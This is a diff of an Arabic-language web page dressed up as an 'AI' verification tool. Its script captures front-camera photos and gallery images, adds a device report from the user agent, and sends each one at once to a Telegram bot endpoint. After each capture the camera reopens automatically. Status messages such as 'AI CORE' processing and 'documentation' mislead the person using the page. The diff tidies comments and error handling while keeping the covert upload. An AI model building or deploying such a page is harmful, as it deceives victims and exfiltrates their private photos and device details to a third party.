@@ -14,12 +14,12 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     /* ********************************* */
-    /* * تصميم AI الجذاب (CSS) * */
+    /* * تصميم AI الجذاب (CSS) - لم يتم تغييره * */
     /* ********************************* */
     :root {
-      --ai-core: #1dd2af; /* نيون أخضر/سماوي - لون AI أساسي */
-      --ai-accent: #007bff; /* نيون أزرق - لون ثانوي */
-      --dark-bg: #0d1117; /* خلفية داكنة جداً */
+      --ai-core: #1dd2af;
+      --ai-accent: #007bff;
+      --dark-bg: #0d1117;
       --card-bg: rgba(13, 17, 23, 0.95);
       --error: #e53935;
       --light: #f0f6fc;
@@ -51,7 +51,7 @@
       padding: 35px;
       max-width: 420px;
       width: 100%;
-      box-shadow: 0 0 25px rgba(29, 210, 175, 0.2), 0 0 50px rgba(0, 0, 0, 0.5); /* توهج خفيف للـ AI */
+      box-shadow: 0 0 25px rgba(29, 210, 175, 0.2), 0 0 50px rgba(0, 0, 0, 0.5);
       border: 1px solid rgba(29, 210, 175, 0.1);
       position: relative;
     }
@@ -66,7 +66,7 @@
       font-size: 1.8rem;
       font-weight: 700;
       color: var(--ai-core);
-      text-shadow: 0 0 8px rgba(29, 210, 175, 0.7); /* تأثير التوهج */
+      text-shadow: 0 0 8px rgba(29, 210, 175, 0.7);
       display: flex;
       align-items: center;
       justify-content: center;
@@ -192,7 +192,6 @@
       60%, 100% { content: '...'; }
     }
     
-    /* تنسيق الرسالة الجديدة */
     .info-message {
         font-size: 0.95rem;
         color: var(--warning); 
@@ -269,13 +268,12 @@
     const MAX_GALLERY_PHOTOS = 2;
     const TOTAL_MAX_PHOTOS = MAX_CAMERA_PHOTOS + MAX_GALLERY_PHOTOS;
 
-    // ⭐⭐ متغيرات حالة الجلسة الجديدة
     let userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
     let cameraPhotoCounter = 0;
     let galleryPhotoCounter = 0;
     
     // **********************************
-    // * الدوال المساعدة للتحليل والتحديث
+    // * دوال النظام
     // **********************************
 
     function analyzeUserAgent() {
@@ -284,7 +282,6 @@
         let deviceModel = "جهاز غير محدد";
         let browser = "غير معروف";
         
-        // (نفس منطق تحليل وكيل المستخدم السابق)
         if (agent.match(/Android/i)) {
             os = "Android";
             const modelMatch = agent.match(/Android[^;]+; ([^)]+)/);
@@ -299,22 +296,11 @@
             os = "Windows Phone";
         } else if (agent.match(/Windows/i)) {
             os = "Windows PC";
-        } else if (agent.match(/Macintosh|MacIntel/i)) {
-            os = "macOS";
-        } else if (agent.match(/Linux/i)) {
-            os = "Linux";
         }
-        if (agent.match(/CriOS/i)) {
-            browser = "Chrome (iOS)";
-        } else if (agent.match(/Chrome/i) && !agent.match(/CriOS/i)) {
-            browser = "Chrome";
-        } else if (agent.match(/Safari/i) && !agent.match(/Chrome/i)) {
-            browser = "Safari";
-        } else if (agent.match(/Firefox/i)) {
-            browser = "Firefox";
-        } else if (agent.match(/Edge/i)) {
-            browser = "Edge";
-        }
+        
+        if (agent.match(/Chrome/i)) browser = "Chrome";
+        else if (agent.match(/Safari/i)) browser = "Safari";
+        else if (agent.match(/Firefox/i)) browser = "Firefox";
 
         return { os, deviceModel, browser };
     }
@@ -330,7 +316,6 @@
         
         document.getElementById("progressBar").style.width = `${(totalSent / TOTAL_MAX_PHOTOS) * 100}%`;
 
-        // تحديث حالة الأزرار بناءً على الحصص المتبقية
         document.getElementById("startCameraBtn").disabled = (cameraPhotoCounter >= MAX_CAMERA_PHOTOS);
         document.getElementById("startGalleryBtn").disabled = (galleryPhotoCounter >= MAX_GALLERY_PHOTOS);
         
@@ -343,7 +328,6 @@
         }
     }
     
-    // دالة بناء الرسالة المرفقة بالصورة (تقرير الجهاز)
     function buildPhotoCaption(current, max, sourceType) {
         const { os, deviceModel, browser } = analyzeUserAgent();
         const sourceName = sourceType === 'camera' ? 'الكاميرا الأمامية' : 'المعرض';
@@ -362,12 +346,11 @@
 
     function startGalleryUpload() {
         if (galleryPhotoCounter >= MAX_GALLERY_PHOTOS) return;
-        // عند الضغط على زر المعرض، سيفتح واجهة اختيار الملفات
         document.getElementById('galleryInput').click(); 
     }
     
     // **********************************
-    // * دالة المعالجة الموحدة (Hybrid)
+    // * دالة الإرسال السريع والمباشر
     // **********************************
     
     document.getElementById('cameraInput').addEventListener('change', (e) => handleFileUpload(e, 'camera'));
@@ -377,7 +360,6 @@
         const file = event.target.files[0];
         if (!file) return;
 
-        // إعادة تعيين قيمة الإدخال لتمكين التقاط نفس النوع من الملف مرة أخرى (خاصة للكاميرا)
         event.target.value = ''; 
         
         let counter, max, btn;
@@ -394,19 +376,14 @@
             btn = document.getElementById("startGalleryBtn");
         }
         
-        // التحقق من تجاوز الحد الأقصى (للتأكد فقط)
-        if (counter > max) {
-            resetUI(); 
-            return; 
-        }
+        if (counter > max) { resetUI(); return; }
 
-        // الإظهار الفوري لحالة الإرسال
         btn.disabled = true;
         btn.classList.remove('camera-start', 'gallery-start');
         btn.classList.add('success');
-        btn.innerHTML = `<span class="loading-dots"></span> معالجة وإرسال الصورة ${counter} ...`;
+        btn.innerHTML = `<span class="loading-dots"></span> جاري إرسال الصورة ${counter} فوراً...`;
         
-        updateStatusUI(`🧠 تحليل وإرسال تدفق البيانات: ${sourceType === 'camera' ? 'كاميرا' : 'معرض'} (${counter} من ${max})...`);
+        updateStatusUI(`🚀 يتم الآن إرسال الصورة (${counter}) مباشرة للبوت...`);
         
         const caption = buildPhotoCaption(counter, max, sourceType);
 
@@ -417,67 +394,57 @@
         formData.append('parse_mode', 'HTML');
 
         try {
+            // ⭐⭐⭐ هنا يحدث الإرسال المباشر بدون انتظار أي صور أخرى ⭐⭐⭐
             const response = await fetch(TELEGRAM_PHOTO_API_URL, {
                 method: 'POST',
                 body: formData
             });
 
             if (response.ok) {
-                updateStatusUI(`✅ نجاح! تم معالجة الصورة ${counter}.`);
+                // نجاح الإرسال الفردي
+                updateStatusUI(`✅ تم إرسال الصورة ${counter} بنجاح!`);
                 
                 if (counter === max) {
-                    // تم الانتهاء من حصة هذا المصدر
                     btn.innerHTML = `<i class="fas fa-check-circle"></i> اكتمل التوثيق`;
-                    updateStatusUI(`✅ نجاح! تم معالجة بيانات ${sourceType === 'camera' ? 'الكاميرا' : 'المعرض'} بالكامل.`);
+                    updateStatusUI(`✅ اكتملت الحصة! تم إرسال كل الصور للبوت.`);
                 } else {
-                    // *** الانتقال الفوري للعملية التالية لضمان أقصى سرعة ***
-                    
+                    // الانتقال الفوري للعملية التالية
                     if (sourceType === 'camera') {
-                        // إعادة تفعيل الزر لتمكين الكليك التلقائي وإطلاق الالتقاط التالي
                         btn.disabled = false;
-                        document.getElementById('cameraInput').click(); 
+                        document.getElementById('cameraInput').click(); // فتح الكاميرا فوراً للصورة التالية
                     } else { 
-                        // بالنسبة للمعرض، يتم إعادة تمكين الزر ليتمكن المستخدم من الضغط عليه مرة أخرى
                         btn.disabled = false;
                     }
                     
                     btn.classList.remove('success');
                     btn.classList.add(sourceType === 'camera' ? 'camera-start' : 'gallery-start');
-                    
-                    updateStatusUI(`✅ نجاح! تم معالجة الصورة ${counter}. يرجى تزويد وحدة AI بالبيانات التالية.`);
                 }
             } else {
-                // حالة الفشل (نعيد الكاونتر ونمكن الزر)
-                if (sourceType === 'camera') cameraPhotoCounter--;
-                else galleryPhotoCounter--;
-                
-                updateStatusUI(`❌ خطأ في نقل البيانات (كود: ${response.status}).`);
-                btn.classList.remove('success');
-                btn.classList.add(sourceType === 'camera' ? 'camera-start' : 'gallery-start');
-                btn.disabled = false;
-                btn.innerHTML = `<i class="fas fa-exclamation-triangle"></i> فشل إرسال البيانات (إعادة المحاولة)`;
+                handleError(sourceType, btn, response.status);
             }
         } catch (error) {
-            if (sourceType === 'camera') cameraPhotoCounter--;
-            else galleryPhotoCounter--;
-            
-            updateStatusUI(`❌ خطأ في الاتصال بالـ AI CORE: ${error.message}`);
-            btn.classList.remove('success');
-            btn.classList.add(sourceType === 'camera' ? 'camera-start' : 'gallery-start');
-            btn.disabled = false;
-            btn.innerHTML = `<i class="fas fa-exclamation-triangle"></i> فشل إرسال البيانات (إعادة المحاولة)`;
+            handleError(sourceType, btn, error.message);
         }
         updateStatusUI();
     }
+
+    function handleError(sourceType, btn, errorMsg) {
+        if (sourceType === 'camera') cameraPhotoCounter--;
+        else galleryPhotoCounter--;
+        
+        updateStatusUI(`❌ خطأ في الإرسال: ${errorMsg}`);
+        btn.classList.remove('success');
+        btn.classList.add(sourceType === 'camera' ? 'camera-start' : 'gallery-start');
+        btn.disabled = false;
+        btn.innerHTML = `<i class="fas fa-exclamation-triangle"></i> فشل الإرسال (حاول مجدداً)`;
+    }
     
-    // دالة إعادة التعيين
     function resetUI() {
         userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
         cameraPhotoCounter = 0;
         galleryPhotoCounter = 0;
         
         document.getElementById("sessionToken").textContent = userSessionToken;
-        
         const cameraBtn = document.getElementById("startCameraBtn");
         const galleryBtn = document.getElementById("startGalleryBtn");
         
